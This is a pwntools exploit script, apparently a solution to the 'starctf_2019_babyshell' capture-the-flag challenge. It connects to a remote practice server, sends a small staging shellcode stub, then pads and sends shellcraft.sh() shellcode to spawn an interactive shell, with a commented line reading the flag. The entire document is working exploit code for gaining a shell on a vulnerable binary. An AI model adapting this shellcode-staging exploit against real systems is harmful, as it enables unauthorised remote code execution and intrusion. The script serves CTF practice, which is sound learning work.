from pwn import *
context(log_level='debug',os='linux',arch='amd64')
#p = process('./starctf_2019_babyshell')
p = remote('node4.buuoj.cn',25548)
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
#gdb.attach(proc.pidof(p)[0],gdbscript="b *0x4008cb")

shellcode = asm('pop rdx;pop rdi;pop rdi;pop rdi;pop rdi;pop rdi;pop rdi;pop rdi;pop rdi;pop rdi;syscall')
p.sendlineafter(' plz:\n',shellcode)

sleep(1) 
p.sendline('a'*(0x10+0x8-len(shellcode)) + str(asm(shellcraft.sh())))

p.interactive()
#p.sendline('cat flag')
